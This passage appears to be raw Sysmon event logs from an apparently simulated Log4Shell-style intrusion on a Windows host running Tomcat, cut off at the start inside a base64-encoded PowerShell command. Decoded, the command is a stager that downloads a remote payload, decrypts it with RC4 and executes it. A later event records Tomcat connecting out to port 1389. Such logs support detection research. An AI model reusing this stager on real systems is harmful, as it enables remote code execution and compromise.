HQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBYAGYAUwBWAEIAOwBbAEkASwAzAGUALQBnAHQAagBUACMAXgB6AEwANABEAF8APABFAC8ALgB2AHIAbwA9AE8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGwAWAB4AGMAQgBkAD0AdgBxAHcAdQBpAG8AagBTAC8AUQBjAGUAaQBMAE4AZABIAFcAdABaAGcAeQBWACsARABwAFkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\",\"ParentUser\":\"NT AUTHORITY\\\\LOCAL SERVICE\"}","EventID":1,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.517Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.7860000Z\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"Protocol\":\"tcp\",\"Initiated\":\"true\",\"SourceIsIpv6\":\"false\",\"SourceIp\":\"192.168.2.5\",\"SourceHostname\":\"-\",\"SourcePort\":\"54225\",\"SourcePortName\":\"-\",\"DestinationIsIpv6\":\"false\",\"DestinationIp\":\"192.168.3.5\",\"DestinationHostname\":\"-\",\"DestinationPort\":\"1389\",\"DestinationPortName\":\"-\"}","EventID":3,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
